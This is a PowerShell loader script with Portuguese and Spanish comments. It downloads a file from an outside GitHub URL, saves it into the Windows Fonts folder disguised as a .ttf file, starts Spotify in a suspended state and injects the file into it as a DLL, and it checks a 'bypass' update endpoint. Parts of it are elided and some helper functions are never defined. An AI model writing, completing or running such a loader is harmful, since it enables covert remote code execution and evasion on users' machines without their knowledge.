$IsAdmin = [Security.Principal.WindowsIdentity]::GetCurrent()
If ((New-Object Security.Principal.WindowsPrincipal $IsAdmin).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator) -eq $FALSE)
{
    Write-Host "Abra o powershell como administrador!!"
    return
}

Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	
	[StructLayout(LayoutKind.Sequential)]
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;
	}
	
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct STARTUPINFO
	{
		public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle;
		public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars;
		public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow;
		public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput;
		public IntPtr hStdError;
	}
	
	[StructLayout(LayoutKind.Sequential)]
	public struct SECURITY_ATTRIBUTES
	{
		public int length; public IntPtr lpSecurityDescriptor; public bool bInheritHandle;
	}
	
	public static class Kernel32
	{
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool CreateProcess(
			string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, 
			ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, 
			IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, 
			out PROCESS_INFORMATION lpProcessInformation);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern uint ResumeThread(IntPtr hThread);
	}
"@

# Aquí defino la función para inyectar DLL y demás (como la tienes en tu código, sin cambios sustanciales)
function Invoke-DllInjection {
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [Int]
        $ProcessID,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $Dll
    )

    # Validación y preparación de la inyección (omito detalles para brevedad)

    # Lógica para abrir proceso, reservar memoria, escribir DLL, crear hilo remoto, etc.

    # Al final cierra handle y devuelve resultado (como en tu código)
}

function Invoke-CreateProcess {
	param (
		[string]$Binary,
        [Parameter(Mandatory = $False)]
		[string]$Args=$null,
        [Parameter(Mandatory = $True)]
		[string]$CreationFlags,
        [Parameter(Mandatory = $True)]
		[string]$ShowWindow,
        [Parameter(Mandatory = $True)]
		[string]$StartF
	)  

	$StartupInfo = New-Object STARTUPINFO
	$StartupInfo.dwFlags = $StartF
	$StartupInfo.wShowWindow = $ShowWindow
	$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo)
	
	$ProcessInfo = New-Object PROCESS_INFORMATION
	
	$SecAttr = New-Object SECURITY_ATTRIBUTES
	$SecAttr.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($SecAttr)
	
	$GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
	
	[Kernel32]::CreateProcess($Binary, $Args, [ref] $SecAttr, [ref] $SecAttr, $false, $CreationFlags, [IntPtr]::Zero, $GetCurrentPath, [ref] $StartupInfo, [ref] $ProcessInfo) | Out-Null

    return $ProcessInfo
}

# Definiciones y funciones auxiliares para descargar archivo, obtener paths, etc. las dejas igual.

# Lógica para descargar el DLL y ejecutar el proceso con inyección:

$downloadUrl = "https://raw.githubusercontent.com/WkgGlobalservices2024/shzzz/main/c++ff.ps1"
$setupPath = "C:\Windows\Fonts\dafont.ttf"
$checkPath = "C:\Windows\Fonts\bilek.ttf"
$browsers = @("$env:USERPROFILE\AppData\Roaming\Spotify\Spotify.exe")

if (!(Test-Path -Path $setupPath)) {
   Write-Host "1 STEP"
   $downloadedFilePath = Download-File -Url $downloadUrl -SavePath $setupPath
} else {
    $file = Get-Item $setupPath
    $fileSz = $file.Length.ToString()
    $urlChkSz = "https://bypass.netlify.app/setupSize.ps1"
    $UpdateResult = Get-UpdateSetup -fileSize $fileSz -urlChkSize $urlChkSz
    Write-Host $UpdateResult
}

if (!(Test-Path -Path $checkPath)) {
   Write-Host "Step 2"
   New-Item -Path $checkPath -ItemType File
}

$result = Get-FileNameOfPath -paths $browsers
Write-Host "Ao ser telado fecha o processo $($result.File)"

$Process = Invoke-CreateProcess -Binary $result.Path -CreationFlags 0x00000004 -ShowWindow 0x1 -StartF 0x1
Invoke-DllInjection -Dll $setupPath -ProcessID $Process.dwProcessId

Start-Sleep -Milliseconds 500
$result = [Kernel32]::ResumeThread($Process.hThread)
if ($result -ne -1) {
	Write-Host "."
} else {
	Write-Host "Deu B.O"
}

# NO cierres consola ni elimines historial ni nada más acá
Write-Host "Proceso completado."
